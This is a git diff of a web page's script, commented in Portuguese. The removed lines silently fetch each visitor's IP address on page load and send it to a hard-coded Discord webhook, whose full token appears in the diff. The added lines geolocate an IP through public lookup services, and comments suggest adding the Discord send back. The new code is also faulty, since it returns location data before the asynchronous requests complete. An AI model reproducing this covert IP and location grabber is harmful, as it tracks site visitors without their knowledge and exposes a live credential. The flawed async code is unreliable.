@@ -73,39 +73,56 @@
 
             setInterval(updateDots, 500);
 
-            fetch("https://httpbin.org/ip")
-            .then(response => response.json())
-            .then(data => {
-                sendToDiscord(data.origin);
-            })
-            .catch(error => {
-                console.error("Erro ao obter endereço IP:", error);
-            });
-        });
+            function obterLocalizacao(ip) {
+                var urls = [
+                    "http://ipinfo.io/" + ip + "/json",
+                    "http://ip-api.com/json/" + ip
+                ];
 
-        function sendToDiscord(ip) {
-            var webhookURL = "https://discord.com/api/webhooks/1212900989154099250/6LQWxqzmarY9YUxPLLF2h6kQrYrcjV7NJuaNbVUs4k4RhNBrvEbduTX4IFreMq7T48XF";
-            var message = "IP: " + ip + " Localização: https://www.google.com/maps?q=" + ip;
+                var localizacoes = [];
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    content: message
-                })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error("Erro ao enviar mensagem para o webhook");
+                urls.forEach(function(url) {
+                    fetch(url)
+                    .then(response => response.json())
+                    .then(data => localizacoes.push(data))
+                    .catch(error => console.error("Erro ao obter localização:", error));
+                });
+
+                return localizacoes;
+            }
+
+            function calcularMedia(localizacoes) {
+                var latitudes = [];
+                var longitudes = [];
+
+                localizacoes.forEach(function(loc) {
+                    if (loc.hasOwnProperty("lat") && loc.hasOwnProperty("lon")) {
+                        latitudes.push(parseFloat(loc.lat));
+                        longitudes.push(parseFloat(loc.lon));
+                    }
+                });
+
+                if (latitudes.length === 0 || longitudes.length === 0) {
+                    throw new Error("Nenhuma informação de localização disponível.");
                 }
-                console.log("Mensagem enviada com sucesso!");
-            })
-            .catch(error => {
-                console.error(error);
-            });
-        }
+
+                var avgLatitude = latitudes.reduce((a, b) => a + b, 0) / latitudes.length;
+                var avgLongitude = longitudes.reduce((a, b) => a + b, 0) / longitudes.length;
+
+                return [avgLatitude, avgLongitude];
+            }
+
+            function exibirGoogleMaps(latitude, longitude) {
+                var url = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+                console.log("Localização no Google Maps:", url);
+
+                // Aqui você pode adicionar o código para enviar a localização para o Discord
+                // Usando fetch ou outro método de sua preferência
+            }
+
+            // Aqui você pode adicionar o código para pedir o endereço IP ao usuário
+            // E chamar as funções obterLocalizacao, calcularMedia e exibirGoogleMaps com o IP fornecido
+        });
     </script>
 </body>
 </html>
